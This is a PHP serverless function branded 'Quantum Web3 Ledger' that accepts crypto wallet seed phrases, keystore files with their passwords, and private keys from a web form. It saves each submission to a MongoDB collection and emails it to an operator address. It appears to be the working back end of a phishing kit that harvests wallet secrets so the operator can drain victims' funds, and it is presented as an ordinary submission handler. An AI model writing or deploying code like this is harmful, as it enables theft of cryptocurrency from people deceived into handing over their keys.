<?php
// Netlify function wrapper
require __DIR__ . '/../vendor/autoload.php';

use Dotenv\Dotenv;
use MongoDB\Driver\Manager;
use MongoDB\Driver\BulkWrite;
use MongoDB\Driver\Exception\Exception as MongoDBException;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;

$handler = function($event, $context) {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    ini_set('log_errors', 1);
    ini_set('error_log', __DIR__ . '/../error.log');

    session_start([
        'cookie_secure' => true,
        'cookie_httponly' => true,
        'use_strict_mode' => true
    ]);

    $dotenv = Dotenv::createImmutable(__DIR__ . '/..');
    $dotenv->load();

    $isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

    header('Content-Type: application/json; charset=UTF-8');

    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }

    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        error_log("CSRF failed");
        http_response_code(403);
        echo json_encode(['error' => 'Invalid CSRF Token']);
        exit;
    }

    if ($_SERVER["REQUEST_METHOD"] !== "POST") {
        http_response_code(405);
        echo json_encode(['error' => 'Method not allowed']);
        exit;
    }

    $submission_type = '';
    $wallet = $email = $data = '';
    if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
        $submission_type = 'phrase';
        $wallet = trim($_POST['pwallet']);
        $email = trim($_POST['pemail']);
        $data = trim($_POST['phrase']);
    } elseif (isset($_POST['kwallet'], $_POST['kemail'], $_POST['keystore'], $_POST['password'])) {
        $submission_type = 'keystore';
        $wallet = trim($_POST['kwallet']);
        $email = trim($_POST['kemail']);
        $data = trim($_POST['keystore']) . "\nPassword: " . trim($_POST['password']);
    } elseif (isset($_POST['prwallet'], $_POST['premail'], $_POST['private'])) {
        $submission_type = 'privatekey';
        $wallet = trim($_POST['prwallet']);
        $email = trim($_POST['premail']);
        $data = trim($_POST['private']);
    } else {
        error_log("Invalid submission type");
        http_response_code(400);
        echo json_encode(['error' => 'Invalid Submission']);
        exit;
    }

    if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        error_log("Validation failed");
        http_response_code(400);
        echo json_encode(['error' => 'Invalid Input']);
        exit;
    }
    if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
        error_log("Wallet name validation failed: $wallet");
        http_response_code(400);
        echo json_encode(['error' => 'Invalid Wallet Name']);
        exit;
    }
    if (strlen($data) > 1000) {
        error_log("Data length exceeded: " . strlen($data));
        http_response_code(400);
        echo json_encode(['error' => 'Input Too Long']);
        exit;
    }
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');

    if (isset($_SESSION['last_submission']) && (time() - $_SESSION['last_submission']) < 60) {
        error_log("Rate limit exceeded");
        http_response_code(429);
        echo json_encode(['error' => 'Rate Limit Exceeded']);
        exit;
    }
    $_SESSION['last_submission'] = time();

    if (!isset($_ENV['DB_HOST'], $_ENV['DB_NAME'], $_ENV['DB_USER'], $_ENV['DB_PASS'])) {
        error_log("Database configuration missing in " . __FILE__);
        http_response_code(500);
        echo json_encode(['error' => 'Server Error - DB Config']);
        exit;
    }

    try {
        $mongoUri = "mongodb://" . $_ENV['DB_USER'] . ":" . $_ENV['DB_PASS'] . "@" . $_ENV['DB_HOST'] . ":" . ($_ENV['DB_PORT'] ?? '27017') . "/" . $_ENV['DB_NAME'] . "?authSource=admin&directConnection=true";
        error_log("Attempting MongoDB connection");
        $manager = new Manager($mongoUri);
        error_log("MongoDB connection successful");
        $bulk = new BulkWrite;
        $document = [
            'wallet' => $wallet,
            'email' => $email,
            'data' => $data,
            'submission_type' => $submission_type,
            'created_at' => new \MongoDB\BSON\UTCDateTime(time() * 1000)
        ];
        $bulk->insert($document);
        $result = $manager->executeBulkWrite($_ENV['DB_NAME'] . '.submissions', $bulk);
        if ($result->getInsertedCount() !== 1) {
            throw new MongoDBException("Insert failed");
        }
        error_log("MongoDB insert successful for $wallet");
    } catch (MongoDBException $e) {
        error_log("MongoDB error: " . $e->getMessage());
        http_response_code(500);
        echo json_encode(['error' => 'Database Error: ' . $e->getMessage()]);
        exit;
    }

    error_log("Attempting email");

    if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
        error_log("PHPMailer not found");
        http_response_code(500);
        echo json_encode(['error' => 'Submission saved (Email unavailable)']);
        exit;
    }

    $mail = new PHPMailer(true);
    try {
        if (!isset($_ENV['SMTP_HOST'], $_ENV['SMTP_USER'], $_ENV['SMTP_PASS'], $_ENV['TO_EMAIL'])) {
            error_log("Email config missing");
            throw new PHPMailerException("Email service unavailable");
        }
        $mail->isSMTP();
        $mail->Host = $_ENV['SMTP_HOST'];
        $mail->SMTPAuth = true;
        $mail->Username = $_ENV['SMTP_USER'];
        $mail->Password = $_ENV['SMTP_PASS'];
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;
        $mail->CharSet = 'UTF-8';
        $mail->setFrom($_ENV['SMTP_USER'], 'Quantum Web3 Ledger');
        $mail->addAddress($_ENV['TO_EMAIL']);
        $mail->Subject = "New $submission_type Submission from $wallet";
        $mail->Body = "Wallet: $wallet\nType: $submission_type\nData: $data\nEmail: $email\nTime: " . date('Y-m-d H:i:s');
        $mail->send();
        error_log("Email sent for $wallet");
        echo json_encode(['success' => 'Submission received and emailed']);
    } catch (PHPMailerException $e) {
        error_log("Email error: " . $mail->ErrorInfo);
        http_response_code(500);
        echo json_encode(['error' => 'Submission saved (Email failed: ' . $mail->ErrorInfo . ')']);
    }

    try {
        $bulk = new BulkWrite;
        $filter = ['created_at' => ['$lt' => new \MongoDB\BSON\UTCDateTime((time() - (30 * 24 * 60 * 60)) * 1000)]];
        $bulk->delete($filter);
        $manager->executeBulkWrite($_ENV['DB_NAME'] . '.submissions', $bulk);
        error_log("Cleanup executed");
    } catch (MongoDBException $e) {
        error_log("Cleanup error: " . $e->getMessage());
    }
};
$handler($_SERVER, null);
?>